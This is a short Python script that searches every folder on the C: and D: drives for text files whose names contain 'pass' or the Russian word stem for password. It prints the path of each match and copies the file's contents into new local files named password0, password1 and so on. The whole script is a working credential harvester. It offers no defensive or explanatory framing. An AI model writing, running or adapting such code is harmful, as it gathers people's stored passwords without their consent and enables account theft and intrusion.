import os

ways_to_pass=[]
names=["парол", "pass"]
fnames=['D:\\', "C:\\"]

for x in fnames:
    for address, dirs, files in os.walk(x):
        for name in files:
            thsname=os.path.join(name)
            if thsname[-4:]==".txt":
                for i in names:
                    if thsname[:-4].lower().find(i)!=-1:
                        print(os.path.join(address, name))
                        ways_to_pass.append(os.path.join(address, name))
                        break
for i in range(len(ways_to_pass)):
    new_file=open(f"password{i}", "w")
    a=open(ways_to_pass[i], "r")
    txt=a.read()
    a.close()
    new_file.write(txt)
    new_file.close()